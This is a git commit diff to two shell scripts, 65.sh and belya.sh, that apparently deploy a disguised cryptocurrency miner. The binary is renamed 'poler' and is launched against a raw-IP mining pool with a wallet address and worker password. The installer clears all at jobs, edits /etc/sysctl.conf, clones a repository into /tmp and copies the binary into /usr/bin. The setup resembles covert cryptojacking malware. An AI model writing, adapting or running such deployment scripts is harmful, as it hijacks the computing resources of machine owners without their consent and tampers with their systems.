fcb154039c131b60c6d94a3324b82a88b565b674
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-06-02 06:35:27 +0300

    t8

--- 65.sh
+++ 65.sh
@@ -1,3 +1,4 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 80 --cpu-priority 3 -o 109.234.35.101:5962 -u 43d7tDnkhtSTX6v1JkpHnjae26tM7kCdDBZFys9zwVAdMwo3dcLyKYP67DjymbW2hc9Hz1fREGKw334YrBBka4MWHHunmiv --pass=t6:lyashko6666@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 80 --cpu-priority 3 -o 109.234.39.150:5972 -u 43d7tDnkhtSTX6v1JkpHnjae26tM7kCdDBZFys9zwVAdMwo3dcLyKYP67DjymbW2hc9Hz1fREGKw334YrBBka4MWHHunmiv --pass=t8-csk-maskva:lyashko6666@gmail.com -k
+
--- belya.sh
+++ belya.sh
@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/aramis/
+rm -rf /tmp/csk-maskva/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir aramis
-git clone https://github.com/tigoratka/aramis.git /tmp/aramis
-cd /tmp/aramis
-chmod +x /tmp/aramis/poler
+cd /tmp && mkdir csk-maskva
+git clone https://github.com/tigoratka/csk-maskva.git /tmp/csk-maskva
+cd /tmp/csk-maskva
+chmod +x /tmp/csk-maskva/poler
 chmod 777 ./*.sh
-cp /tmp/aramis/poler /usr/bin/
+cp /tmp/csk-maskva/poler /usr/bin/
 sleep 3
 
 sudo apt-get install dos2unix
